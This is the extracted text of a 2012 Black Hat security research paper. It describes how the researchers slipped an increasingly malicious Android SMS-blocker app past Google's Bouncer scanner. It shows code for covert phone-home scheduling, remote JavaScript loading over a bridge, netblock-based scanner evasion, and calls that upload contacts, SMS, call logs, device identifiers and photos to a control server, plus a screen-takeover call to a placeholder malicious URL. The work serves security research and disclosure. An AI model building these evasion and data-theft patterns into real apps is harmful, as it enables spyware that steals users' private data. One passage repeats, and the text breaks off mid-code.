{
    "id": "e49b11c8-763a-4d8d-a4ec-67bc41128367",
    "created_at": "2022-10-25T16:48:24.326101Z",
    "updated_at": "2025-03-27T02:16:25.516808Z",
    "deleted_at": null,
    "sha1_hash": "50a78f9df0196803cbbb6b6fe9c79aa0811a42a4",
    "title": "Microsoft Word - Trustwave - SpiderLabs - Adventures in Bouncerland - Black Hat USA 2012 - PAPER.docx",
    "authors": "",
    "file_creation_date": "2012-07-11T22:00:28Z",
    "file_modification_date": "2012-07-11T22:00:28Z",
    "file_size": 2665010,
    "plain_text": "## Failures of Automated Malware Detection \n\n within Mobile Application Markets\n\n Nicholas J. Percoco\n\n Sean Schulte\n\n**70 W. Madison Street, Suite 1050 Chicago, IL 60602** **www.trustwave.com**\n\n\n# Black Hat USA 2012\n\n Adventures in BouncerLand\n\n## Failures of Automated Malware Detection \n\n within Mobile Application Markets\n\n Nicholas J. Percoco\n\n Sean Schulte\n\n\n-----\n\n## Table of Contents\n\n### Introduction ............................................................................ 3\n\n Our Motivations ....................................................................... 4\n\n What We Knew About “Bouncer” ............................................ 5\n\n Research Approach and Process ............................................. 6\n###### Phase \r 0 \r – \r Version \r 1.0 \r – \r Begin \r the \r Benign \r ............................................................................................................... \r 6 Phase \r 0.1 \r – \r Version \r 1.0.1 \r – \r Double \r Check \r ............................................................................................................ \r 11 Phase \r 1 \r through \r 7 \r ................................................................................................................................................. \r 12 Making \r a \r Purchase \r ................................................................................................................................................ \r 18 Final \r Test \r – \r Let’s \r Get \r Caught! \r ................................................................................................................................ \r 19\n\n### What We Learned About “Bouncer” ...................................... 22\n\n Conclusions ........................................................................... 23\n\n About the Authors ................................................................. 24\n###### Nicholas \r J. \r Percoco \r ................................................................................................................................................ \r 24 Sean \r Schulte \r .......................................................................................................................................................... \r 24\n\n### About Trustwave ................................................................... 25\n###### About \r Trustwave \r SpiderLabs \r ................................................................................................................................ \r 25 Contacts \r ................................................................................................................................................................ \r 25\n\nFigure 1: SMS Bloxor’s Icon .......................................................................................................................... 7\n\nFigure 2: SMS Bloxor Promo Ad .................................................................................................................... 7\n\nFigure 3: SMS Blox in action ......................................................................................................................... 8\n\nFigure 4: Our Google Android Developer Account Activated ............................................................................ 9\n\nFigure 5: SMS Bloxor Uploaded and Active .................................................................................................. 10\n\nFigure 6: SMS Blox Published ..................................................................................................................... 10\n\nFigure 7: First Sign of Bouncer ................................................................................................................... 10\n\nFigure 8: Version 1.0.1 Uploaded ................................................................................................................ 11\n\nFigure 9: 2[nd] Showing of Bouncer ............................................................................................................... 11\n\nFigure 10: SMS Bloxor Available to Purchase – Cheap! ................................................................................. 12\n\nFigure 11: Our Comand & Control Server Interface ...................................................................................... 14\n\nFigure 12: Making the first and only purchase of SMS Bloxor ........................................................................ 18\n\nFigure 14: Bouncer Bounced Us .................................................................................................................. 21\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            2\n\n\n-----\n\n## Introduction\n\nAs an end user, we never hear a friend or a colleague exclaim, “My mobile phone just got a virus!!!” Is it\nbecause the threat does not exist or is something else going on?\n\nUnfortunately for us security geeks, mobile devices were not made for us. The devices we use every day were\nmade for the masses. Jailbreaking or Rooting aside, there isn’t an “expert mode” you can turn on and get access\nto all the activity going on within your device. The security or anti-virus offering aren’t all that great either –\nthey are mainly signature-based and do not have the ability to look at anything below the application layer or\nuser space within the operating system. Oddly enough, walk around any security conference and you’ll see just\nabout everyone using an iOS or Android device. If any one of those devices was to be exploited during the\nconference there would likely be no visual indication of such an incident and the conference attendee would go\nabout their day unknowingly exposed to malicious activity.\n\nWe live in a time where as a mobile device user the security is mostly left up to blind faith. The mobile device\nindustry is at a place in history where decisions today will be amplified a hundred-fold five, ten or even 20 years\nfrom now. We are at a point where those who have been in the security industry long enough can use our\nexperience to predict that unless the major players in the mobile industry do something very soon, we’ll likely\nexperience catastrophic incidents targeting mobile devices in the not too distant future.\n\nWhen you look at the mobile device landscape there are many attack vectors that one could look at for research\npurposes. Obviously finding a zero-day Remote Code Execution (RCE) is difficult but the rewards could be great\nfor both the researcher and also the criminal community piggybacking upon such efforts. They could be used in\ntargeted attacks against high profile individuals and yield impressive results.\n\nThrough our team’s incident response investigations, we know targeted attacks against individuals do exist and\nhave been increasing. We have also seen such attacks target mobile devices as a way to reach the individual on\na very personal level such as being able to read calendar entries, GPS coordinates and even record audio and\nvideo. While these attacks and the exploits that enable them are extremely interesting, the average consumer,\nthe group we feel will be hit hardest when the mobile malware dam breaks, will never encounter an “espionage”\ntype of attack, rather their world will be turned upside down by a mass-malware attack likely propagated via an\napplication they knowingly downloaded and installed on their device.\n\nThere are a few various mobile application markets. They most popular are the Apple App Store, Google Play\n(formally known as Google Android Market) and the Amazon Appstore for Android. It is publically known that all\napps are subject to a mostly manual review process in the Apple and Amazon markets. For Google Play, until\nvery recently there was no review at all. Google now employs a solution to keep bad applications out of their\nmarket called “Bouncer”.\n\nWho “Bouncer” is and what method he uses to distinguish between good and bad applications was a mystery to\nall of us except those involved with the project at Google.\n\nFor security concerned consumers and those in security positions at enterprises and governments the question\nof “Bouncer’s” effectiveness is top of mind.\n\nIs it fully automated or is there actually a room fully of college interns testing out every single application that is\nsubmitted? How difficult is it to get past “Bouncer” and have a piece of malware published in Google Play? When\nwe embarked on our research journey, we didn’t know, but we wanted to find out.\n\nAfter completing our research, we felt like we had been on an adventure where each step along the way was a\npath to a higher level of “achievement”, so the abstract of our Black Hat USA talk was written to resemble a\nchildren’s story:\n\nMeet SMS Bloxor. He is a single function app that wanted to be much more. He always looked up at those elite\nmalware and botnet apps but now that the Google’s Bouncer moved into town his hopes and dreams appeared\nto be shattered. This was until he was handed a text file while strolling along a shady part of the Internet (AKA\nPastebin). The title of this txt file was “Bypassing Google’s Bouncer in 7 steps for Fun and Profit”. Upon reading\nthis, our little app began to glow with excitement. He routed himself all the way to the gates of Google Play and\nbegan his journey from a simple benign app that allowed users to block SMS messages from their ex’s to a full\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            3\n\n\n-----\n\nfledged info stealing botnet warrior. In this presentation will tell the story of how our little app beat the Bouncer\nand got the girl (well, at least all her personal information, and a few naughty pics).\n\n## Our Motivations\n\nGoogle is one of the largest, most well-respected technology companies on the planet. They have incredible\nsearch technology and bleeding edge research projects where cars can drive themselves and navigate obstacles\nthat would make most drivers falter at very high speeds[1]. They are also the developer of one of the fastest\ngrowing operating systems in history – Android. Over 800,000 Android devices are being activated on mobile\nnetworks every single day[2]. That’s 800,000 new consumers who have the ability to spend money and likely do in\nGoogle Play.\n\nAccording to Horace Dediu’s analysis[3], Google makes $1.70 per Android device per year, which reached $400\nmillion in revenue in 2011. That’s a lot of cash that could be spent on Android development and making them\nmore secure for consumers.\n\nNow we all know that malware in Android markets has been a problem in recent years. Through our own\nresearch we’ve found variants of Zeus, SpyEye and other nastiness just waiting to be downloaded by\nunsuspecting consumers. Historically, Google had relied upon informed consumers and security researchers to\nreport malware to them. They would then verify the report and promptly remove the malicious application from\nthe market before any more damage could be done.\n\nTo us and to likely others in the security industry this appeared to be a battle that was lost the day the Google\nAndroid market first opened. Relying upon users to report malware to you in order to remove it is a little\nbackwards from a defense perspective. Obviously, if you control entry into the market, a proactive approach in\nkeeping the malware out in the first place is a great idea.\n\nThe smart people over at Google were thinking the same thing and decided to use some of that pile of cash to\nfund a project. The project would develop a solution to keep malware out of the Google Android Market. On\nFebruary 2, 2012, Google announce such a project, “codenamed Bouncer”[4].\n\nWhen we heard about this project, we rejoiced that this Android malware problem might have met its match\nbecause the same people who are developing self-driving cars have figured out how to beat this growing beast\nof a problem with a “Bouncer”.\n\nAs security researchers we became curious. With “Bouncer” in place 1) how difficult would it be to get malicious\napplication submitted, and 2) how long would it take for one to get caught? Since it was called “Bouncer”, it\nalmost naturally draws an analogy to an underage kid and the local bar. You might try 10 different types of fake\nIDs before one works, but even then someone is going to notice you look a little young and kick you out.\n\nHiroshi Lockheimer’s blog post[5] pointed to “behaviors that indicate an application might be misbehaving”. So we\nset off to create an application that increasingly misbehaved to see when and at what point in our research we\nwould be stopped. The results would be to test the limits and the start of the art of mobile application market\nmalware detection.\n\nWe set off on this research journey knowing that we would have some successes and some failures to share\nwith first Google and ultimately the information security community so that those who are tasked at developing\nboth public and private application markets can learn from our experience.\n\n1 https://plus.google.com/116899029375914044550/posts/MVZBmrnzDio\n2 http://googlemobile.blogspot.com/2012/02/androidmobile-world-congress-its-all.html\n3 http://www.asymco.com/2012/04/02/android-economics/),\n4 http://googlemobile.blogspot.com/2012/02/android-and-security.html\n5 http://googlemobile.blogspot.com/2012/02/android-and-security.html\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            4\n\n\n-----\n\n## What We Knew About “Bouncer”\n\nUntil February 2[nd], 2012 we didn’t know that “Bouncer” even existed. On that day, thanks to Hiroshi\nLockheimer’s blog post[6], we learned the following characteristics:\n\n   - It’s automated.\n\n   - It scans both new applications and those already in the market.\n\n   - It looks for known malware immediately upon upload by a developer.\n\n   - It’s also behavior based.\n\n   - It is run on Google’s cloud.\n\n   - It simulates Android’s runtime.\n\n   - It looks for “hidden, malicious” behavior.\n\nAll in all, as a researcher and from a malware developer’s perspective, “Bouncer” sounds like he is well equipped\nto catch our little friend “SMS Bloxor” pretty quickly. Given the resources that Google has at their disposal, at\nthis stage in our research we expected our spell of curiosity to be squashed pretty quickly.\n\nThis paper includes the process we followed and the results of the activities around our research in quest to test\nthe bounds of “Bouncer” and his ability to detect and expel malware from the Google Play marketplace.\n\n6 http://googlemobile.blogspot.com/2012/02/android-and-security.html\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            5\n\n\n-----\n\n## Research Approach and Process\n\nIn early February 2012, we had a meeting to discussion the possibility of performing research on the topic of\n“Failures of Automated Malware Detection with Mobile Application Marketplaces”.\n\nMuch of the previous research around mobile devices had been in our lab with hardware and software we had in\nour possession and could fully control. In order to explore “Bouncer” and his capabilities, we couldn’t replicate\nthat environment in our lab. The concept of doing research in a live system / environment that we didn’t own\nhad a major obstacle that we were challenged to overcome:\n\n1. Attempting to gain access to one of Google’s systems outside the application development and\n\npublishing process they defined could likely be considered “hacking” Google. This was something we felt\nwould be irresponsible, could result in damage of Google’s systems and nor did we feel that Google\nwould take this activity lightly should we find an issue and then disclose it to them.\n2. By placing active malware into the Google Play marketplace we were risking the possibility of a\n\nlegitimate end-user downloading our malware and in turn becoming infected. This was something that\nwe felt we could control during our research and did so by putting controls in place during the process\nwe followed.\n\nDuring our subsequent research meetings, we proposed that we begin with the development of a completely\nbenign application. We would then apply for a legitimate Google Play developer account and publish the\napplication just like anyone else who was participating in a mobile app development process. We didn’t want our\ninitial publishing to look or smell like a “researcher” account should Bouncer have some checks in place to weed\nout possible malicious developer accounts.\n\nTo test the bounds of “Bouncer” we considered incrementally adding more and more malicious functionality to\nthe application through incremental versions to see when and why we were flagged as malware and removed\nfrom the marketplace.\n\nAt this stage of our research we didn’t even know when and how often “Bouncer” scanned applications that\nwere submitted. Would it only be the first time? Would it be once per version update or even more frequently?\nThis was something we wanted to answer during our research as well.\n\nWe were also considering that if we could develop a method of hiding the malicious functionality from Bouncer,\nwe could likely update the application and never be flagged or removed as malware.\n\nThis would basically allow us to completely bypass Bouncer and publish a malicious application in the\nmarketplace that would never be flagged.\n\nLastly, like in our previous research[7] we did not want to perform any functionality that was blatantly malicious\nso functionality such as attempting to root Bouncer or obtain shell access was not in scope. We wanted to use\nthe legitimate tools provided by the Android SDK to attempt to beat Bouncer at his game.\n\nTo accomplish this goal we broke up our research process into 7 phases. There were actually 10 phases in our\nresearch, the first two being used to set a baseline, the middle 7 used to update the application with malicious\nfunctionality and a final phase where we wanted to see if was even possible to get caught. The following section\nof this paper outline the process we followed and the results we obtained from our research.\n\n#### Phase 0 – Version 1.0 – Begin the Benign \n\nWe wanted to reduce and eliminate the risk of a legitimate end-user finding our app and installing it on their\ndevice. To accomplish this, we did some research to identify a type of application that was both very common in\nthe marketplace, but also could legitimately have features or functionality that could be used for malicious\npurposes long term. For example, we knew we were going to want access to a bunch of things that require\npermissions; it looks suspicious if you ask for permission for something that you might not have a legitimate\n\n7 https://www.defcon.org/html/links/dc-archives/dc-19-archive.html#Percoco2\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            6\n\n\n-----\n\nreason to access within your app, so we wanted to come up with an app that would have reasonable cause to\nrequest a variety of permissions.\n\nAfter a short period of time, we decided about developing a common application such as an “SMS Blocker”.\n\nAfter developing the initial version of the application, we fully branded it so it would not stand out under\n(potential) manual review as a half-baked or potentially malicious application. We decided to call our application\n“SMS Bloxor”.\n\nFigure 1: SMS Bloxor’s Icon\n\nFigure 2: SMS Bloxor Promo Ad\n\nAt this stage, we did not know if we could trust Google that the actual “Bouncer” was fully automated. With\nGoogle’s resources they could have a data center full of college students reviewing and testing each application\nthat was submitted to the marketplace. While we did feel this was unlikely, in the odd chance that someone did\nperform a manual functionality review we wanted it to appear that the developers invested time in the branding\nand marketing of their application.\n\nThe functionality of this application was very simple: upon launch the end user could define a phone number to\nblock and no longer receive SMS messages from.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            7\n\n\n-----\n\nFigure 3: SMS Blox in action\n\nAnother small bit of functionality that we added to this benign version was the ability for the application to\n“phone home” on periodic basis. In this version of the application this functionality did nothing more than tell us\nif Google’s “Bouncer” allowed outbound traffic from the sandbox it ran from. If this was the case (and we had\nhoped it would be), we might be able to tell when and where the application was running from within the\nGoogle environment. This could be an important piece of information as we moved forward.\n\nTo phone home, we used a simple BroadcastReceiver. The first thing to do is put it into the Android Manifest,\nwhich tells the system to allow the object to act as a receiver:\n```\n<receiver android:name=\".receiver.CommunicationReceiver\" />\n\n```\nIn our BroadcastReceiver, we schedule it to run itself again in the future using a PendingIntent and the\nAlarmManager.\n```\nIntent alarmIntent = new Intent(context, CommunicationReceiver.class);\nPendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent,\nPendingIntent.FLAG_UPDATE_CURRENT);\nAlarmManager alarmManager =\n(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);\nalarmManager.set(AlarmManager.RTC_WAKEUP, nextTime(), pendingIntent);\n\n```\nThe “nextTime()” method used the interval we specified to determine the next timestamp (AlarmManager wants\nit in milliseconds) to execute. We’re using AlarmManager.RTC_WAKEUP, so the app will phone home even when\nit’s sleeping in your pocket. Note: This isn’t very good for battery life, but as “malware developers”, we don’t\ncare much about being green.\n\nOur BroadcastReceiver sets itself up to run again after it runs. So we just need a way to kick it off initially – we\nhave the application do that every time you open it, and we also schedule it to start when the phone boots up.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            8\n\n\n-----\n\nThis requires an extra permission, but we considered that to be worth it to make sure the malware is always\nrunning.\n\nA Background Service will appear in the list of “currently running apps”. The user can then choose to force quit\nthe app, if they want to. Using BroadcastReceiver/AlarmManager, our app does NOT appear in the list of\nrunning apps unless they’ve recently opened it. (In other words, it appears to the user as if the app is acting\nnormally, and not doing anything in the background.)\n\nOn our backend control server, we’re just serving up some Javascript at /api (both GET and POST), and we\nrecord the parameters that are included in the request. At this stage, that’s just the IP address and some basic\nbuild information about the phone (which does not require a permission to access).\n\nOnce all the pieces of the initial version were complete, we proceeded to sign up for Google Android developer\naccount. This account was setup in the name of “Nicholas J. Percoco” and he paid the registration fee. Shortly\nafter completing the developer registration process, we were granted access to publish our application.\n\nFigure 4: Our Google Android Developer Account Activated\n\nIn working to mitigate the risk of having an end user download and install our test application on their mobile\ndevice, we decided to take another precaution in our research. We priced the application well above any other\nsimilar application in the Google Play marketplace. There are dozens of SMS bocker applications in the market\ntoday, most of which are free or less than $2.00 to purchase. The price we chose was significantly higher, but\nnot something that was astronomical that might result in unwanted attention either. We settled on the price of\n$49.95.\n\nAt this point we logged into our Google Play developer account and preceded to fill in all the fields, upload all\nthe logos and screens shots. We finally uploaded Version 1.0 of “SMS Bloxor” for publishing.\n\nWe also needed to set the permission for this application and did so with those that we would be legitimate for\nthis type of application.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            9\n\n\n-----\n\nFigure 5: SMS Bloxor Uploaded and Active\n\nWe were about to click the “Publish” button and realized we wanted to charge for the download of the\napplication. Google requires application developers to have a Google Checkout merchant account to do so. We\napplied for one of those accounts and within a few minutes had the ability to set the price of our application we\nwere going to “sell” in the market. The entire establishing of a developer account, uploading the application,\nand establishing and linking a Google Checkout account was performed in less than 1 hour.\n\nFigure 6: SMS Blox Published\n\nWe then published our application and within few minutes, the application phoned back to our control server\nand left its mark:\n\nFigure 7: First Sign of Bouncer\n\nWe now knew more about “Bouncer” than we previously had or at least were able to validate some of Google’s\nclaims about what it did:\n\n  - We knew that they did scan upon publishing and was likely automated.\n\n  - We also knew were Bouncer lived. The IP address 74.125.19.84 was owned by Google.\n\n  - We also knew that they wanted it to at least appear to be running as an “HTC Sapphire / T-Mobile\nmyTouch 3G”. We felt this was interesting considering if this was running in Google’s cloud it would be\nrunning within an emulator and not an actual hardware device. The emulator that comes with the\nAndroid SDK does not pretend to be a particular phone; it is quite noticeably an emulator.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            10\n\n\n-----\n\n#### Phase 0.1 – Version 1.0.1 – Double Check  \n\nAt this point, we had a single scan of our benign application, but we didn’t want to trust that Bouncer’s scanning\nactivity would happen each time or in the same way. We waited about a day and developed a new version of\nthe application to upload.\n\nAgain this was a completely benign version of the application, it had all the functionality that we advertised with\nan addition of phoning home to our control server to tell us that it was in fact being scanned by Google.\n\nWe then proceeded to upload Version 1.0.1 with the minor change in place.\n\nFigure 8: Version 1.0.1 Uploaded\n\nAgain within a mater of a few minutes, we saw activity in our control server’s logs:\n\nFigure 9: 2[nd] Showing of Bouncer\n\nWe saw something new this time. Bouncer was now running on a different IP Address but within the same net\nblock.\n\nWe also verified that our application was available in Google Play (at this point in our research it was still called\nAndroid Market but changed branding shortly after).\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            11\n\n\n-----\n\nFigure 10: SMS Bloxor Available to Purchase – Cheap!\n\n#### Phase 1 through 7\n\nAfter running two successful tests and obtaining the IP address information, we knew where Bouncer lived.\n\nThis raised an interesting question: With simple net block information could we perhaps use this against\nBouncer and hide our malicious functionality from him indefinitely?\n\nWe decided to go down the path of the following process:\n\n  - If our application was run within the Google net block used by Bouncer, then don’t execute any\nmalicious functionality.\n\n  - If it is run from anywhere else[8], then do run the malicious functionality.\n\nThis would basically be a two-faced application. The one we submitted when running within the Google\nenvironment will appear to be completely benign, but when downloaded by an end user would be as malicious\nas we wanted it to be.\n\nAs an additional level precaution, we decided to define “anywhere else” as just a segment within the Trustwave\nSpiderLabs network[9]. This would ensure that if in the unlikely chance someone paid $49.95 for a SMS blocker,\nthey would get exactly what they paid for and nothing else.\n\n8 During the entire duration of our research not a single person outside of our research team downloaded and installed our\napplication on their device. This was also verified by Google during the debrief with them post-research.\n\n9 If someone from our team happened to purchase this app, well then I guess we’d be having a little fun now wouldn’t we?\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            12\n\n\n-----\n\nUpon discussion, we decided that we also didn t want to rule out the chance that someone at Google as part of\nthe Bouncer process might actually manually review our application and more specifically at the code level. If\nwe had unused and malicious functionality within the application this would certainly raise a red flag and result\nin our application being removed by Bouncer.\n\nWe needed to find a way to build an application that in every respect was completely benign until we didn’t\nwant it to be. Again, we turned to legitimate functionality allowed by Google and often used by other\ndevelopers. We decided to look at a very popular application, Facebook, for hints on how we could accomplish\nour goal.\n\nFacebook, along with many other popular apps including Netflix and LinkedIn, use what’s called a “hybrid”\napproach, where the app is written in HTML and Javascript and distributed inside a “native wrapper”. This allows\nit to live amongst the other native apps and provides access to the phone’s native capabilities.\n\nA web app running in the browser is sandboxed out of accessing the phone’s contact list, but a web app that\nlives in a native wrapper can access the contact list through the platform’s Javascript bridge.\n\nFacebook and Netflix, etc. use the hybrid approach because they have more HTML and Javascript talent than\nnative app development skills on staff, and also because it enables them to take a cross-platform approach to\ndevelopment; they can essentially build one (HTML) app and distribute on multiple platforms in a way that takes\nadvantage of those platforms’ native capabilities.\n\nUpon learning that Facebook not only distributes Javascript with their app, but also uses it for continuous\ndeployment and to rapidly test and release new features without requiring an app update, we knew we were\nonto something. Every website downloads new, unsigned code that gets executed on your computer or mobile\ndevice; but not every operating system allows that code to access whatever it wants.\n\nLike Facebook, we included Javascript in our application, as distributed through our app in the market. We built\nour app such that the normal flow of operations for our legitimate functionality would call the Javascript; and we\nbuilt it such that it can download new Javascript, so we can update the functionality of the app without requiring\na user to download a new version:\n```\nWebView webView = new WebView(context);\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.addJavascriptInterface(bridge, \"Bridge\");\nwebView.loadData(RawFileReader.readFile(webView.getContext(), R.raw.default_js),\n\"text/html\", \"UTF-8\");\n\n```\nWhen we need to load new functionality from the control server:\n```\nwebView.postUrl(API_ENDPOINT, postData(bridge));\n\n```\nAnd if it fails for any reason, then we immediately fall back to the default Javascript that comes with the app, so\nthe app continues to work.\n\nAfter studying what Facebook was doing within their application, we decided that if we developed legitimate\nfunctionality within our application that were in scope for a “SMS Blocker” we could utilize a Javascript bridge to\ndynamically enable malicious functionality when we wanted to. Specifically, we would never enable this\nfunctionality when Bouncer scanned our application.\n\nUsing this method, even a manual review of our application would only reveal exactly the functionality that we\nwere using in the benign “face” of our application. It would not be until the application phoned home and we\ngave it a malicious payload to download and execute on a “victim’s” device.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            13\n\n\n-----\n\nThis process also allowed us to develop our control server into a command and control (C&C) system that would\nallow us to selectively deploy selective malicious functionality to the “victim’s” devices very much like modern\nand advanced malware performs in PC the world.\n\nFigure 11: Our Comand & Control Server Interface\n\nOur C&C server can enable any of the malicious functionality upon our request. We can also combine\nfunctionality to “smash and grab” as much data as possible in a single request, although this would be noisy\nfrom a device activity perspective and may have performance issues on lower end devices.\n\nBelow is a walk through of each of the phases, with notes on the functionality we added from both a legitimate\nand malicious point of view. We also included some code snippets for the developers reading this paper who\nmight want to explore these concepts themselves.\n\nIn addition, we noted activity about Bouncer here as well since at this point in our research we fully expected\nhim to scan our application each time. We also didn’t expect him to identify anything malicious and allow it to be\npublished within the Google Play market.\n\n  - **Phase 1**\n\n`o` Application Version\n\n          - 1.1\n`o` Legitimate Functionality\n\n          - Select phone numbers from your contacts to block.\n\n          - We can use Javascript within our app, for legitimate functionality:\n\n              - `view.loadUrl(String.format(\"javascript:addToBlacklist('%s')`\n```\n               \", sender));\n\n```\n`o` Malicious Functionality\n\n          - There are a lot of social networking applications that can utilize your phone contacts to\nhelp you find additional “friends” within their network. Our functionality allows us to\ndump and download all of the contacts on a victim’s phone whenever we want.\n\n              - `Bridge.addListToData(\"contacts\",`\n```\n               Bridge.getContactPhoneNumbers());\n\n```\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            14\n\n\nFigure 11: Our Comand & Control Server Interface\n\nOur C&C server can enable any of the malicious functionality upon our request. We can also combine\nfunctionality to “smash and grab” as much data as possible in a single request, although this would be noisy\nfrom a device activity perspective and may have performance issues on lower end devices.\n\nBelow is a walk through of each of the phases, with notes on the functionality we added from both a legitimate\nand malicious point of view. We also included some code snippets for the developers reading this paper who\nmight want to explore these concepts themselves.\n\nIn addition, we noted activity about Bouncer here as well since at this point in our research we fully expected\nhim to scan our application each time. We also didn’t expect him to identify anything malicious and allow it to be\n\n\n-----\n\n        - We send this Javascript down to the phone, and it calls the same legitimate\nfunctionality to get the contacts, but uploads it back to our server.\n\n        - We can also add/remove numbers to be blocked, which will not appear to the user:\n\n            - `addToBlacklist(\"H:12345\");`\n`o` Bouncer Scan Results\n\n        - Bouncer scanned only once:\n\n            - `74.125.19.87`\n\n            - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n- **Phase 2**\n\n`o` Application Version\n\n        - 1.2\n`o` Legitimate Functionality\n\n        - View your SMS history, and block numbers that have communicated with you the past.\n\n        - The idea being that if you’re getting annoying SMS messages, you don’t have to\nremember the number, you can just find the annoying messages and choose to block\nthem right within our app.\n`o` Malicious Functionality\n\n        - Since our application is involved in SMS blocking, the malicious functionality for this\nphase focuses on obtaining the blocked and received SMS messages from the victim’s\ndevice.\n\n            - Bridge.addListToData(\"sms_records\",\nBridge.getSmsRecords());\n\n        - Again, we just send that Javscript down to the phone, it executes the legitimate code,\nbut uploads it to our server.\n`o` Bouncer Scan Results\n\n        - Bouncer scanned once, from a different IP:\n\n            - `74.125.114.92`\n\n            - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n- **Phase 3**\n\n`o` Application Version\n\n        - 1.3\n`o` Legitimate Functionality\n\n        - See your own phone number when selecting contacts.\n\n        - That’s a fairly common feature of contacts viewing apps, so it wouldn’t seem like\nsomething is amiss.\n\n        - We needed to add one permission:\n\n            - `<uses-permission`\n```\n             android:name=\"android.permission.READ_PHONE_STATE\" />\n\n```\n        - In addition to the user’s phone number, that gives us access to the ANDROID_ID, the\ndevice id, the voicemail number, the subscriber id (IMEI number), and the SIM serial\nnumber. We don’t show those to the user.\n`o` Malicious Functionality\n\n        - Performing reconnaissance on a victim’s phone is something that could be beneficial to\nthe attackers. This information could drive other functionality in the malware. A decision\ntree could be built into the C&C server by detecting the OS, phone number and other\ninformation about the device and only serving up malicious functionality that is known\nto work on the target device such as rooting or other device specific functionality.\n\n        - We get all the phone info and upload it to our server:\n\n            - `Bridge.addObjectToData(\"phone_info\",`\n```\n             Bridge.getPhoneInfo());\n\n```\n        - Again, we just call the same method that we legitimately do in the app.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            15\n\n\n-----\n\n        - Bouncer Stealth Mode:\n\n            - We also added a feature that would block the malware from ever being sent to\nany IP in 74.125.*.*\n`o` Bouncer Scan Results\n\n        - **This time Bouncer did not scan us. We don’t know why.**\n\n- **Phase 4**\n\n`o` Application Version\n\n        - 1.4\n`o` Legitimate Functionality\n\n        - Select photos to associate with your contacts.\n\n            - We could just read the photo you’ve already associated with the contact, but if\nyou’re going to block them maybe you want a different picture in our app?\nMaybe this app was just made by a novice developer?\n\n        - We didn’t have to add any picture-related permissions for this functionality.\n\n            - `getContentResolver().query(MediaStore.Images.Media.EXTERNAL`\n```\n             _CONTENT_URI, null, null, null,\n             MediaStore.Images.Media.DATE_TAKEN);\n\n```\n`o` Malicious Functionality\n\n        - This malicious functionality isn’t something a SMS blocker would generally need access\nto, but since we allowed the end user to attach photos to the contacts or other phone\nnumbers they were blocking, we felt it would pass the sniff test should this application\nundergo a manual functionality or code review. With this in place, we could specify a\nspecific image to download or just pull down all images in the victim’s camera roll.\n\n            - Bridge.addObjectToData(\"photo\",\nBridge.chooseRandom(Bridge.getPhotos()));\n\n            - Bridge.addObjectToData(\"photo\",\nBridge.chooseFirst(Bridge.getPhotos()));\n\n            - Bridge.addObjectToData(\"photo\",\nBridge.chooseLast(Bridge.getPhotos()));\n\n            - Bridge.addObjectToData(\"photo\",\nBridge.chooseItem(Bridge.getPhotos(), 2));\n`o` Bouncer Scan Results\n\n        - We were scanned within minutes of uploading the update:\n\n            - `74.125.114.85`\n\n            - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n- **Phase 5**\n\n`o` Application Version\n\n        - 1.5\n`o` Legitimate Functionality\n\n        - View your phone call records, and add those numbers to the SMS blacklist.\n\n            - This seems like a bit of a stretch for legitimate functionality, but we added it\nanyway to see if we could get any sort of reaction out of Bouncer.\n\n            - `getContentResolver().query(CallLog.Calls.CONTENT_URI, null,`\n```\n             null, null, null);\n\n```\n`o` Malicious Functionality\n\n        - At this point, we began to stop playing it as safe as we had been and start to request\naccess to other areas of the device that while might be in the “class” of what an SMS\nblocker is involved with wasn’t entirely something this app should be doing. Using this\nwe could use our C&C server to request a copy of the call records from the victim’s\ndevice at will.\n\n            - `Bridge.addListToData(\"phone_records\",`\n```\n             Bridge.getPhoneRecords());\n\n```\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            16\n\n\n-----\n\n`o` Bouncer Scan Results\n\n        - They scanned us once.\n\n            - `74.125.19.86`\n\n            - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n- **Phase 6**\n\n`o` Application Version\n\n        - 1.6\n`o` Legitimate Functionality\n\n        - We “monetize” the app using advertisements.\n\n        - We display an ad inside the app, and when you click it, we open up the browser to\nshow a web page.\n`o` Malicious Functionality:\n\n        - At DEF CON 19, we disclosed a flaw in the Android operating system that would 1)\nallow any application on the device to see which application was in the foreground and\n2) steal the focus of the application in the foreground by placing a screen in front of the\nforeground application. We demonstrated that we could use this functionality to steal\ncredentials from another application. Building this ability within our application allows us\nto dynamically steal credentials when we wanted to rather than allow the application to\nrun attack logic using timed intervals on its own.\n\n            - Bridge.openAd(\"http://malicious.fake/target\");\n\n        - By sending down this bit of Javascript, we’re able to force the phone to open any\nwebsite we want to any time we want to. The user doesn’t need to have our app open,\nor even have the screen turned on. We completely take over the screen with any web\npage we want.\n`o` Bouncer Scan Results:\n\n        - We were scanned once.\n\n            - `74.125.19.87`\n\n            - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n- **Phase 7 – Version 1.7**\n\n`o` Application Version\n\n        - 1.7\n`o` Legitimate Functionality:\n\n        - We added “analytics” support. It’s not real, but it looks like it might be real if someone\nwas to review the application.\n```\n           public void sendAnalytics(final String target, final int\n           numEvents) {\n             AsyncTask<String, String, String> task = new\n           AsyncTask<String, String, String>() {\n                @Override\n                protected String doInBackground(String... targets) {\n                    for (int i=0; i < numEvents; i++) {\n                        HttpClient client = new\n           DefaultHttpClient();\n       